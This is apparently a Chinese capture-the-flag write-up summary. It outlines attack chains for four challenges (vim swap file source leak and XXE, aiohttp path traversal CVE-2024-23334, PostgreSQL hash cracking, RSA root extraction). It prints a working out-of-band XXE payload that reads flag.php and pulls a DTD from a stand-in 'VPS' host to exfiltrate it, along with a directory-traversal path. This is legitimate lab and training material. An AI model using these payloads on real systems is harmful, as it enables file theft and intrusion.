## 攻击链

1. 1. Web_sql_xxe: vi -r index.php.swp 拿源码 → 登录界面 POST XML → out-of-band XXE 读 flag.php / 2. Web_aio: aiohttp 目录穿越 CVE-2024-23334 → /static/../../../../var/lib/redis/dump.rdb / 3. Misc_PG: 蚁剑下载 pg.tar.gz → docker 启动 PostgreSQL → rockyou 爆破 hash → flag / 4. Crypto_1zRSA: p^2 ≈ n → next_prime(iroot(n)) 拿 p → AMM 算法开 e=33 次方根

## 关键 payload

```
<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" ><!ENTITY % dtd SYSTEM "http://VPS:8000/evil.dtd" >%dtd;%send;]> ; /static/../../../var/lib/redis/dump.rdb ; p1=gmpy2.iroot(n,2)[0] ; while n % p1 != 0: p1 = gmpy2.next_prime(p1) ; AMM(c, 33, p)
```
